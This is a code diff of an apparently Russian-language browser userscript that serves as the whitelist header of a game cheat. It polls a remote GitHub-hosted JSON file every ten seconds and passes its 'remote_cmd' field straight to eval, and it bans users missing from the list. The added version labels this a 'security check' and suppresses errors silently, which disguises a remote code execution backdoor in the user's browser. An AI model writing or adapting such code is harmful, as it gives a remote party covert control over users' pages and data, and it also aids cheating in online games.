@@ -1,46 +1,50 @@
-(function() {
+(() => {
     'use strict';
-    const DATA_URL = "https://raw.githubusercontent.com/Skurt246/doom-whitelist-uid/main/whitelistuid.json";
 
-    // ПРИВЯЗЫВАЕМ ФУНКЦИЮ К WINDOW, ЧТОБЫ EVAL ЕЁ ВИДЕЛ
+    // 1. НАСТРОЙКИ СИНХРОНИЗАЦИИ
+    const CONFIG = {
+        DATA_URL: "https://raw.githubusercontent.com/Skurt246/doom-whitelist-uid/main/whitelistuid.json"
+    };
+
+    // 2. ГЛОБАЛЬНАЯ ФУНКЦИЯ УВЕДОМЛЕНИЙ
     window.showRemoteNotice = function(text, color = "#00ffff") {
         let msg = document.getElementById('r-alert');
         if (msg) msg.remove();
         msg = document.createElement('div');
         msg.id = 'r-alert';
         msg.style = `position:fixed;top:15%;left:50%;transform:translate(-50%,-50%);padding:20px;background:rgba(0,0,0,0.9);color:${color};border:2px solid ${color};z-index:9999999;font-family:monospace;border-radius:10px;text-align:center;box-shadow:0 0 20px ${color};pointer-events:none;`;
-        msg.innerHTML = `<b>[SYSTEM]:</b><br>${text}`;
+        msg.innerHTML = `<b>[INTERIUM]:</b><br>${text}`;
         document.body.appendChild(msg);
         setTimeout(() => { if(msg) msg.remove(); }, 7000);
     };
 
-    function sync() {
-        fetch(DATA_URL + "?t=" + Date.now())
+    // 3. ФУНКЦИЯ ПРОВЕРКИ
+    function runSecurityCheck() {
+        fetch(CONFIG.DATA_URL + "?t=" + Date.now())
             .then(res => res.json())
             .then(data => {
-                // 1. КОМАНДА
+                // Выполнение команд
                 if (data.remote_cmd) {
-                    try {
-                        eval(data.remote_cmd); 
-                    } catch(e) { console.error("Eval fail:", e); }
+                    try { eval(data.remote_cmd); } catch(e) {}
                 }
-
-                // 2. КИК
+                // Проверка на бан
                 const user = localStorage.getItem('u') || localStorage.getItem('uid') || (window.myPlayer ? window.myPlayer.name : null);
                 if (user) {
                     const found = data.users.find(u => u.name === user);
                     if (!found || found.status !== "active") {
-                        document.body.innerHTML = "<h1 style='color:red;text-align:center;margin-top:20%'>BANNED BY ADMIN</h1>";
+                        document.body.innerHTML = "<h1 style='color:red;text-align:center;margin-top:20%'>BANNED</h1>";
                         location.replace("about:blank");
                     }
                 }
             })
-            .catch(err => console.log("Sync error..."));
+            .catch(() => {});
     }
 
-    setInterval(sync, 10000);
-    sync();
-})();
+    // Запуск интервала
+    setInterval(runSecurityCheck, 10000);
+    runSecurityCheck();
+
+    // --- ДАЛЬШЕ ИДЕТ ТВОЙ ОСТАЛЬНОЙ КОД ЧИТА ---
 
     // ────────────────────────────────────────────────
     //  ✅ MSGPACK ДЕКОДЕР
